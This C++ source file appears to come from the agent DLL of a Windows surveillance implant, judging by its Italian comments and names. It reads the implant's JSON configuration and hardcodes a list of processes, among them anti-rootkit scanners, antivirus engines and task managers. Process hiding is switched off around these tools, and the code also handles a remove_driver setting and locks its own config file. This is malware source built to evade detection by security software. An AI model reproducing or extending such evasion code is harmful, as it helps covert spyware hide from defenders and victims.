#include <windows.h>
#include <json/JSON.h>
#include "common.h"
#include "bss.h"
#include "H4-DLL.h"
#include "LOG.h"

static const char* bypass_json_list = R"(
[
	{ "processName:": "outlook.exe", "description": "*Outlook*"},
	{ "processName:": "ielowutil.exe" },
	{ "processName:": "TaskMan.exe", "description": "Security Task Manager" },
	{ "processName:": "hackmon.exe", "description": "Detects*rootkits*"},
	{ "processName:": "hiddenfinder.exe", "description": "*Hidden*Process*Finder*" },
	{ "processName:": "Unhackme.exe", "description": "Detects*rootkits*" },
	{ "processName:": "fsbl.exe", "description" : "*Secure*BlackLight*"},
	{ "processName:": "sargui.exe", "description" : "Sophos Anti*Rootkit*" },
	{ "processName:": "avgarkt.exe", "description" : "AVG Anti*Rootkit*" },
	{ "processName:": "avscan.exe" },
	{ "processName:": "RootkitRevealer.exe", "description": "Rootkit detection utility*"},
	{ "processName:": "taskmgr.exe" },
	{ "processName:": "avgscanx.exe" },
	{ "processName:": "IceSword.exe" },
	{ "processName:": "rku*.exe" },
	{ "processName:": "pavark.exe", "description": "*pavark*" },
	{ "processName:": "avp.exe" },
	{ "processName:": "bgscan.exe" },
	{ "processName:": "FlashPlayerPlugin_*.exe" },
	{ "processName:": "avk.exe" },
	{ "processName:": "k7*.exe" },
	{ "processName:": "rootkitbuster*.exe", "description":"Trend Micro RootkitBuster*"},
	{ "processName:": "pcts*.exe" },
	{ "processName:": "iexplore.exe", "description":"*Internet Explorer*" },
	{ "processName:": "chrome.exe", "description":"*Google*Chrome*"},
	{ "processName:": "fsm32.exe", "description": "*F-Secure Settings*"}
]
)";

// Usata per lockare il file di conf
static HANDLE conf_file_handle = NULL;

// Passa alla callback tutti i sotto-oggetti dell'oggetto "section" nella configurazione json
typedef void (WINAPI* conf_callback_t)(JSONObject, DWORD counter);
BOOL HM_ParseConfSection(char* conf, WCHAR* section, conf_callback_t call_back)
{
	JSONValue* value;
	JSONObject root;
	DWORD counter = 0;

	value = JSON::Parse(conf);
	if (!value)
		return FALSE;
	if (value->IsObject() == false) {
		delete value;
		return FALSE;
	}
	root = value->AsObject();

	if (root.find(section) != root.end() && root[section]->IsArray()) {
		JSONArray jarray = root[section]->AsArray();
		for (unsigned int i = 0; i < jarray.size(); i++) {
			if (jarray[i]->IsObject())
				call_back(jarray[i]->AsObject(), counter++);
		}
	}
	delete value;
	return TRUE;
}

// Passa l'oggetto json delle globals
BOOL HM_ParseConfGlobals(char* conf, conf_callback_t call_back)
{
	JSONValue* value;
	JSONObject root, obj;

	value = JSON::Parse(conf);
	if (!value)
		return FALSE;
	if (value->IsObject() == false) {
		delete value;
		return FALSE;
	}
	root = value->AsObject();

	if (!root[L"globals"]->IsObject()) {
		delete value;
		return FALSE;
	}
	obj = root[L"globals"]->AsObject();
	call_back(obj, 0);

	delete value;
	return TRUE;
}

BOOL HM_CountConfSection(char* conf, WCHAR* section, DWORD* count)
{
	JSONValue* value;
	JSONObject root;

	*count = 0;
	value = JSON::Parse(conf);
	if (!value)
		return FALSE;
	if (value->IsObject() == false) {
		delete value;
		return FALSE;
	}
	root = value->AsObject();

	if (root.find(section) != root.end() && root[section]->IsArray()) {
		JSONArray jarray = root[section]->AsArray();
		*count = jarray.size();
	}
	delete value;
	if (*count != 0)
		return TRUE;
	return FALSE;
}


void WINAPI ParseBypassCallback(JSONObject conf_json, DWORD dummy)
{
	DWORD index;
	JSONArray bypass_array = conf_json[L"nohide"]->AsArray();
	shared.process_bypassed = bypass_array.size();
	if (shared.process_bypassed > MAX_DYNAMIC_BYPASS)
		shared.process_bypassed = MAX_DYNAMIC_BYPASS;
	shared.process_bypassed += EMBEDDED_BYPASS; // Inserisce i processi hardcoded

	// Legge i processi rimanenti dal file di configurazione
	for (index = 0; index < bypass_array.size(); index++)
		_snprintf_s(shared.process_bypass_list[index + EMBEDDED_BYPASS], MAX_PBYPASS_LEN, _TRUNCATE, "%S", bypass_array[index]->AsString().c_str());
}

void WINAPI ParseDriverHandling(JSONObject conf_json, DWORD dummy)
{
	shared.g_remove_driver = (BOOL)conf_json[L"remove_driver"]->AsBool();
}


static void setup_bypass_list()
{
	JSONValue* value = JSON::Parse(bypass_json_list);
	if (value != NULL && value->IsArray()) {
		JSONArray arr = value->AsArray();
		for (int i = 0; i < arr.size(); i++) {
			JSONObject& obj = const_cast<JSONObject&>(arr[i]->AsObject());
			sprintf_s(shared.process_bypass_list[i], "%S", obj[L"processName"]->AsString().c_str());

			if (obj[L"description"] != NULL) {
				wcscpy(shared.process_bypass_desc[i], obj[L"description"]->AsString().c_str());
			}
			//strcpy(shared.process_bypass_list[i], r[L"processName"].
		}
	}

	delete value;

}
// Legge le configurazioni globali
void HM_UpdateGlobalConf()
{
	HANDLE h_conf_file;
	DWORD readn;
	char conf_path[DLLNAMELEN];
	char* conf_memory;

	// Se non riesce a leggere la configurazione, inizializza comunque
	// i valori globali.
	memset(&date_delta, 0, sizeof(date_delta));
	// Lista di processi da non toccare
	shared.process_bypassed = EMBEDDED_BYPASS;
	ZeroMemory(shared.process_bypass_list, sizeof(shared.process_bypass_list));
	ZeroMemory(shared.process_bypass_desc, sizeof(shared.process_bypass_desc));
	
	setup_bypass_list();	// get from json array attributes

	// Legge il delta date dal file di stato...
	Log_RestoreAgentState(PM_CORE, (BYTE*)&date_delta, sizeof(date_delta));

	// Legge la lista dei processi da bypassare e la gestione del driver
	conf_memory = HM_ReadClearConf(shared.H4_CONF_FILE);
	if (conf_memory) {
		HM_ParseConfGlobals(conf_memory, &ParseBypassCallback);
		HM_ParseConfGlobals(conf_memory, &ParseDriverHandling);
	}
	SAFE_FREE(conf_memory);
}

void LockConfFile()
{
	char conf_path[DLLNAMELEN];
	HM_CompletePath(shared.H4_CONF_FILE, conf_path);
	FNC(SetFileAttributesA)(conf_path, FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_ARCHIVE);
	conf_file_handle = FNC(CreateFileA)(conf_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
}

void UnlockConfFile()
{
	DWORD i;
	char conf_path[DLLNAMELEN];

	HM_CompletePath(shared.H4_CONF_FILE, conf_path);

	if (conf_file_handle)
		CloseHandle(conf_file_handle);
	conf_file_handle = NULL;

	for (i = 0; i < MAX_DELETE_TRY; i++) {
		if (FNC(SetFileAttributesA)(conf_path, FILE_ATTRIBUTE_NORMAL))
			break;
		Sleep(DELETE_SLEEP_TIME);
	}
}